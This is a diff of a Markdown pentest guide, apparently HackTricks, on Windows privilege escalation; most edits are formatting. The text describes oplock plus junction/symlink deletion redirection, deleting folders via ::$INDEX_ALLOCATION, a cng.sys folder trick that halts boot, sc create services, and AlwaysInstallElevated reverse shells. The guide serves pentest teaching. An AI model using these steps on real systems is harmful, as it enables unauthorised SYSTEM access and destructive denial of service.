+  * Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
+  * **Boom**: Your code is executed **as SYSTEM**.
 
 ### From Arbitrary File Delete/Move/Rename to SYSTEM EoP
 
@@ -1698,21 +1633,25 @@ This stream stores the **index metadata** of the folder.
 So, if you **delete the `::$INDEX_ALLOCATION` stream** of a folder, NTFS **removes the entire folder** from the filesystem.
 
 You can do this using standard file deletion APIs like:
+
 ```c
 DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
 ```
 
-> Even though you're calling a *file* delete API, it **deletes the folder itself**.
+> Even though you're calling a _file_ delete API, it **deletes the folder itself**.
 
 ### From Folder Contents Delete to SYSTEM EoP
-What if your primitive doesn’t allow you to delete arbitrary files/folders, but it **does allow deletion of the *contents* of an attacker-controlled folder**?
+
+What if your primitive doesn’t allow you to delete arbitrary files/folders, but it **does allow deletion of the&#x20;**_**contents**_**&#x20;of an attacker-controlled folder**?
 
 1. Step 1: Setup a bait folder and file
-- Create: `C:\temp\folder1`
-- Inside it: `C:\temp\folder1\file1.txt`
+
+* Create: `C:\temp\folder1`
+* Inside it: `C:\temp\folder1\file1.txt`
 
 2. Step 2: Place an **oplock** on `file1.txt`
-- The oplock **pauses execution** when a privileged process tries to delete `file1.txt`.
+
+* The oplock **pauses execution** when a privileged process tries to delete `file1.txt`.
 
 ```c
 // pseudo-code
@@ -1721,23 +1660,24 @@ WaitForDeleteToTriggerOplock();
 ```
 
 3. Step 3: Trigger SYSTEM process (e.g., `SilentCleanup`)
-- This process scans folders (e.g., `%TEMP%`) and tries to delete their contents.
-- When it reaches `file1.txt`, the **oplock triggers** and hands control to your callback.
+
+* This process scans folders (e.g., `%TEMP%`) and tries to delete their contents.
+* When it reaches `file1.txt`, the **oplock triggers** and hands control to your callback.
 
 4. Step 4: Inside the oplock callback – redirect the deletion
 
-- Option A: Move `file1.txt` elsewhere
-    - This empties `folder1` without breaking the oplock.
-    - Don't delete `file1.txt` directly — that would release the oplock prematurely.
-
-- Option B: Convert `folder1` into a **junction**:
+* Option A: Move `file1.txt` elsewhere
+  * This empties `folder1` without breaking the oplock.
+  * Don't delete `file1.txt` directly — that would release the oplock prematurely.
+* Option B: Convert `folder1` into a **junction**:
 
 ```bash
 # folder1 is now a junction to \RPC Control (non-filesystem namespace)
 mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
 ```
 
-- Option C: Create a **symlink** in `\RPC Control`:
+* Option C: Create a **symlink** in `\RPC Control`:
+
 ```bash
 # Make file1.txt point to a sensitive folder stream
 CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
@@ -1746,8 +1686,10 @@ CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
 > This targets the NTFS internal stream that stores folder metadata — deleting it deletes the folder.
 
 5. Step 5: Release the oplock
-- SYSTEM process continues and tries to delete `file1.txt`.
-- But now, due to the junction + symlink, it's actually deleting:
+
+* SYSTEM process continues and tries to delete `file1.txt`.
+* But now, due to the junction + symlink, it's actually deleting:
+
 ```
 C:\Config.Msi::$INDEX_ALLOCATION
 ```
@@ -1756,19 +1698,19 @@ C:\Config.Msi::$INDEX_ALLOCATION
 
 ### From Arbitrary Folder Create to Permanent DoS
 
-Exploit a primitive that lets you **create an arbitrary folder as SYSTEM/admin** —  even if **you can’t write files** or **set weak permissions**.
+Exploit a primitive that lets you **create an arbitrary folder as SYSTEM/admin** — even if **you can’t write files** or **set weak permissions**.
 
 Create a **folder** (not a file) with the name of a **critical Windows driver**, e.g.:
+
 ```
 C:\Windows\System32\cng.sys
 ```
 
-- This path normally corresponds to the `cng.sys` kernel-mode driver.
-- If you **pre-create it as a folder**, Windows fails to load the actual driver on boot.
-- Then, Windows tries to load `cng.sys` during boot.
-- It sees the folder, **fails to resolve the actual driver**, and **crashes or halts boot**.
-- There’s **no fallback**, and **no recovery** without external intervention (e.g., boot repair or disk access).
-
+* This path normally corresponds to the `cng.sys` kernel-mode driver.
+* If you **pre-create it as a folder**, Windows fails to load the actual driver on boot.
+* Then, Windows tries to load `cng.sys` during boot.
+* It sees the folder, **fails to resolve the actual driver**, and **crashes or halts boot**.
+* There’s **no fallback**, and **no recovery** without external intervention (e.g., boot repair or disk access).
 
 ## **From High Integrity to System**
 
@@ -1781,13 +1723,12 @@ sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
 ```
 
-> [!TIP]
-> When creating a service binary make sure it's a valid service or that the binary performs the necessary actions to fast as it'll be killed in 20s if it's not a valid service.
+> \[!TIP] When creating a service binary make sure it's a valid service or that the binary performs the necessary actions to fast as it'll be killed in 20s if it's not a valid service.
 
 ### AlwaysInstallElevated
 
 From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
-[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)
+[More information about the registry keys involved and how to install a _.msi_ package here.](./#alwaysinstallelevated)
 
 ### High + SeImpersonate privilege to System
 
@@ -1802,7 +1743,7 @@ Using this technique is usually **selected any process running as SYSTEM with al
 ### **Named Pipes**
 
 This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
-If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
+If you want to [**learn more about name pipes you should read this**](./#named-pipe-client-impersonation).\
 If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).
 
 ### Dll Hijacking
@@ -1812,9 +1753,9 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 
 ### **From Administrator or Network Service to System**
 
-- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
-- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
-- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)
+* [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
+* [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
+* [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)
 
 ### From LOCAL SERVICE or NETWORK SERVICE to full privs
 
@@ -1862,7 +1803,7 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 
 **Meterpreter**
 
-_multi/recon/local_exploit_suggestor_
+_multi/recon/local\_exploit\_suggestor_
 
 You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
 
@@ -1872,23 +1813,21 @@ C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the 
 
 ## References
 
-- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
-- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
-- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
-- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
-- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
-- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
-- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
-- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
-- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
-- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
-- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
-- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)
+* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
+* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
+* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
+* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
+* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
+* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
+* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
+* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
+* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
+* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
+* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
+* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
+* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)
+* [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
+* [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
 
-- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
-
-- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
-
-{{#include ../../banners/hacktricks-training.md}}
+\{{#include ../../banners/hacktricks-training.md\}}
